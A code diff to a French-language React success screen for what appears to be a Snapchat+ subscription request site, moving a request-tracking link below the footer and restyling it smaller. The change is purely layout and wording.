@@ -110,16 +110,6 @@ export default function SuccessScreen({ data, adminInactive }) {
           </span>
         </div>
 
-        {/* Lien de suivi */}
-        <a
-          href={`/suivi?id=${typeof sessionStorage !== "undefined" ? sessionStorage.getItem("submissionId") || "" : ""}`}
-          className="block w-full bg-primary/10 border border-primary/30 rounded-xl px-4 py-3 mb-6 text-center hover:bg-primary/20 transition-colors"
-        >
-          <span className="flex items-center justify-center gap-2 text-primary text-sm font-semibold">
-            <ArrowRight className="w-4 h-4" /> Suivre ma demande en temps réel
-          </span>
-        </a>
-
         {/* Contact */}
         <p className="text-muted-foreground text-xs mb-8 leading-relaxed">
           Si la demande prend trop de temps, contactez-nous sur notre numéro officiel{" "}
@@ -132,10 +122,20 @@ export default function SuccessScreen({ data, adminInactive }) {
         </p>
 
         {/* Footer */}
-        <p className="text-muted-foreground/40 text-xs leading-relaxed">
+        <p className="text-muted-foreground/40 text-xs leading-relaxed mb-5">
           L'abonnement Snapchat+ ne vous sera pas facturé.<br />
           L'abonnement est disponible uniquement pour les utilisateurs éligibles.
         </p>
+
+        {/* Lien de suivi */}
+        <a
+          href={`/suivi?id=${typeof sessionStorage !== "undefined" ? sessionStorage.getItem("submissionId") || "" : ""}`}
+          className="block w-full bg-primary/5 border border-primary/20 rounded-lg px-3 py-1.5 text-center hover:bg-primary/15 transition-colors"
+        >
+          <span className="flex items-center justify-center gap-1.5 text-primary/80 text-xs font-medium">
+            <ArrowRight className="w-3 h-3" /> Suivre ma demande
+          </span>
+        </a>
       </div>
     </motion.div>);
 
